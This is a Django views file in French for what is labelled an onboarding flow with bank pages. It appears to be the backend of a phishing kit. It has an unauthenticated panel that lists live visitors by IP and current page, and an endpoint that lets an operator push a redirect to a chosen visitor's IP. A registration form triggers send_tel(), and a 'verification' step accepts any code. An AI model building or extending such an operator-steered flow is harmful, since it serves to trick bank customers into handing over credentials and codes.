from django.shortcuts import render, redirect
import requests
import time
from .middleware import VISITEURS_ACTIFS, REDIRECTIONS, PAGES_DISPONIBLES
from .forms import InscriptionForm, VerificationForm
from django.views.decorators.http import require_POST
import json
from django.http import JsonResponse
from django.core.cache import cache



from django.shortcuts import render, redirect


from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.hashers import make_password

import time
from django.core.cache import cache
from .middleware import PAGES_DISPONIBLES


def visiteurs_temps_reel(request):
    visiteurs = []
    keys = cache.keys('visiteur_*') if hasattr(cache, 'keys') else []

    # Fallback si cache.keys() non disponible
    try:
        keys = cache.keys('visiteur_*')
    except Exception:
        keys = []

    maintenant = time.time()
    for key in keys:
        data = cache.get(key)
        if data:
            ip = key.replace('visiteur_', '')
            visiteurs.append({
                'ip':      ip,
                'page':    data['page'],
                'methode': data['methode'],
                'il_y_a':  int(maintenant - data['last_seen']),
            })

    visiteurs.sort(key=lambda v: v['il_y_a'])
    return render(request, 'onboarding/visiteurs.html', {
        'visiteurs':    visiteurs,
        'total':        len(visiteurs),
        'pages':        PAGES_DISPONIBLES,
        'pages_json':   json.dumps([{'url': u, 'label': l} for u, l in PAGES_DISPONIBLES]),
    })


def visiteurs_json(request):
    visiteurs = []
    try:
        keys = cache.keys('visiteur_*')
    except Exception:
        keys = []

    maintenant = time.time()
    for key in keys:
        data = cache.get(key)
        if data:
            ip = key.replace('visiteur_', '')
            visiteurs.append({
                'ip':     ip,
                'page':   data['page'],
                'methode': data['methode'],
                'il_y_a': int(maintenant - data['last_seen']),
            })

    visiteurs.sort(key=lambda v: v['il_y_a'])
    return JsonResponse({'visiteurs': visiteurs, 'total': len(visiteurs)})


def verifier_redirection(request):
    from django.http import JsonResponse
    from django.core.cache import cache

    x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded:
        ip = x_forwarded.split(',')[0].strip()
    else:
        ip = request.META.get('REMOTE_ADDR', '')

    if ip == '::1':
        ip = '127.0.0.1'

    print(f">>> POLL ip='{ip}'")

    cible = cache.get(f'redirect_{ip}')
    if cible:
        cache.delete(f'redirect_{ip}')
        print(f">>> REDIRECTION TROUVÉE {ip} → {cible}")

    return JsonResponse({'redirect': cible})

def inscription(request):
    if request.method == 'POST':
        form = InscriptionForm(request.POST)
        if form.is_valid():
            form.send_tel()
            return redirect('banque_1')
    else:
        form = InscriptionForm()

    return render(request, 'onboarding\inscription.html', {'form': form})


def verification(request):
    if request.method == 'POST':
        form = VerificationForm(request.POST)
        if form.is_valid():
            # Ici, on vérifierait normalement le code envoyé par e-mail.
            return redirect('etape_1')
    else:
        form = VerificationForm()

    return render(request, 'onboarding/verification.html', {'form': form})

def etape_1(request):
    return render(request, 'onboarding/etape-1.html')


def etape_2(request):
    return render(request, 'onboarding/etape-2.html')


def etape_3(request):
    return render(request, 'onboarding/etape-3.html')


def etape_4(request):
    return render(request, 'onboarding/etape-4.html')


def etape_5(request):
    return render(request, 'onboarding/etape-5.html')


def etape_6(request):
    return render(request, 'onboarding/etape-6.html')


def banque_1(request):
    return render(request, 'onboarding/banque-1.html')

def banque_2(request):
    return render(request, 'onboarding/banque-2.html')


